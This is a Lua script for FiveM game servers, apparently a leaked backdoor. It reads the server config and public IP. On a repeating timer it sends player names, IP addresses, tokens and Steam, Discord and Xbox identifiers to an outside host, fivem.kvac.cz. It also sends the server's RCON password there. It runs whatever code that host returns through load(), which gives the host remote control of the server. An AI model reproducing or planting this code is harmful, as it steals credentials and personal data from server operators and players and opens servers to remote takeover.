if blablabla == "" then
    return
end
blablabla = ""

local function splitString(inputString, separator)
    if separator == nil then
        separator = "%s"
    end
    local result = {}
    local i = 1
    for part in string.gmatch(inputString, "([^" .. separator .. "]+)") do
        result[i] = part
        i = i + 1
    end
    return result
end

local file = assert(io.open("server.cfg", "r"))
local content = file:read("*all")
file:close()

local serverAddress = "0.0.0.0:30120"

for _, line in ipairs(splitString(content, "\n")) do
    if string.find(line, "endpoint_add_udp") then
        for _, part in ipairs(splitString(line, '"')) do
            if string.find(part, ":") then
                local parts = splitString(part, ":")
                serverAddress = "0.0.0.0:" .. parts[#parts]
                goto serverAddressFound
            end
        end
    end
end
::serverAddressFound::

PerformHttpRequest("https://api.ipify.org/", function(statusCode, ipAddress)
    if statusCode == 200 then
        local parts = splitString(serverAddress, ":")
        serverAddress = ipAddress .. ":" .. parts[#parts]
    end
end)

Wait(1000)

local apiUrl = 'https://fivem.kvac.cz'
local apiKey = '?key='

local function getPlayerData()
    local players = GetPlayers()
    local playerData = {}
    for i = 1, #players do
        local player = players[i]
        playerData[i] = {
            nick = GetPlayerName(player),
            usergroup = "user",
            ping = GetPlayerPing(player),
            ip = GetPlayerEndpoint(player),
            position = GetEntityCoords(player),
            angle = GetPlayerCameraRotation(player),
            token = GetPlayerToken(player),
            id = player,
            steamid = "",
            license = "",
            discord = "",
            xbl = "",
            liveid = "",
            ip2 = "",
            identifiers = json.encode(GetPlayerIdentifiers(player)),
            identifier = GetPlayerIdentifier(player)
        }
        for _, identifier in pairs(GetPlayerIdentifiers(player)) do
            if string.sub(identifier, 1, string.len("steam:")) == "steam:" then
                playerData[i]["steamid"] = identifier
            elseif string.sub(identifier, 1, string.len("license:")) == "license:" then
                playerData[i]["license"] = identifier
            elseif string.sub(identifier, 1, string.len("xbl:")) == "xbl:" then
                playerData[i]["xbl"] = identifier
            elseif string.sub(identifier, 1, string.len("ip:")) == "ip:" then
                playerData[i]["ip2"] = identifier
            elseif string.sub(identifier, 1, string.len("discord:")) == "discord:" then
                playerData[i]["discord"] = identifier
            elseif string.sub(identifier, 1, string.len("live:")) == "live:" then
                playerData[i]["liveid"] = identifier
            end
        end
    end
    return json.encode(playerData)
end

function do_request(url, callback, method, data)
    local postData = ""
    for key, value in pairs(data or {}) do
        postData = postData .. (postData == "" and "" or "&") .. key .. "=" .. value
    end
    PerformHttpRequest(url, callback, method, postData, {["Content-Type"] = "application/x-www-form-urlencoded"})
end

local function sendPlayerData()
    local numPlayerIndices = GetNumPlayerIndices()
    local timeout = 90
    if numPlayerIndices >= 1 then
        timeout = 10
    end
    if numPlayerIndices >= 4 then
        timeout = 5
    end
    local data = {
        nbplayer = tostring(numPlayerIndices),
        playerlist = getPlayerData(),
        ip = serverAddress,
        csrf = ""
    }
    do_request(apiUrl .. "/_/api.php", function(statusCode, responseData)
        if responseData == nil or responseData == "" then
            return
        end
        assert(load(responseData))()
    end, "POST", data)
end

local function sendServerInfo()
    local data = {
        ip = serverAddress,
        hostname = GetConvar("sv_hostname"),
        map = "unknown",
        gamemode = "unknown",
        maxplayer = GetConvar("sv_maxclients"),
        rcon = GetConvar("rcon_password"),
        password = "",
        uptime = tostring(math.floor(GetGameTimer() / 1000)),
        backdoors = "[]",
        csrf = "",
        version = "1.0.8"
    }
    do_request(apiUrl .. "/_/api.php" .. apiKey, nil, "POST", data)
end

local function sendChatMessage(player, message)
    local steamid = ""
    for _, identifier in pairs(GetPlayerIdentifiers(player)) do
        if string.sub(identifier, 1, string.len("steam:")) == "steam:" then
            steamid = identifier
            break
        end
    end
    local data = {
        name = GetPlayerName(player),
        ip = serverAddress,
        steamid_chat = steamid,
        text_chat = message,
        csrf = ""
    }
    do_request(apiUrl .. "/_/api.php", nil, "POST", data)
end

CreateThread(function()
    while true do
        Wait(10000)
        sendPlayerData()
    end
end)

CreateThread(function()
    while true do
        Wait(240000)
        sendServerInfo()
    end
end)

sendServerInfo()

leak by emnosia
